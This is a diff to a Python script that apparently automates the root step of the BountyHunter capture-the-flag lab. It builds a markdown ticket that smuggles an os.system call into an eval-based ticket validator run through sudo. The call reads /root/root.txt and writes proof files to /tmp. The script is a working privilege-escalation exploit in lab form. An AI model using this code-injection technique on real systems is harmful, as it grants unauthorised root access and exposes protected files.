@@ -91,17 +91,17 @@ assert sudo.returncode == 0 and "/opt/skytrain_inc/ticketValidator.py" in sudo.s
 print("PASS: actual sudoers rule exposes only the Skytrain ticket validator", flush=True)
 
 payload = (
-    "# Skytrain Inc\\n"
-    "## Ticket to QA\\n"
-    "__Ticket Code:__\\n"
+    "# Skytrain Inc\n"
+    "## Ticket to QA\n"
+    "__Ticket Code:__\n"
     '**32+__import__("os").system("id > /tmp/bountyhunter-root-proof; '
     'cat /root/root.txt > /tmp/bountyhunter-root-flag-proof; '
-    'chmod 0644 /tmp/bountyhunter-root-proof /tmp/bountyhunter-root-flag-proof")+1000**\\n'
+    'chmod 0644 /tmp/bountyhunter-root-proof /tmp/bountyhunter-root-flag-proof")+1000**\n'
 )
 encoded_ticket = base64.b64encode(payload.encode("utf-8")).decode("ascii")
 remote = (
     "printf '%s' '" + encoded_ticket + "' | base64 -d > /tmp/skytrain-ci.md && "
-    "printf '/tmp/skytrain-ci.md\\n' | "
+    "printf '/tmp/skytrain-ci.md\n' | "
     "sudo -n /usr/bin/python3 /opt/skytrain_inc/ticketValidator.py"
 )
 validation = ssh(password, remote, timeout=25)
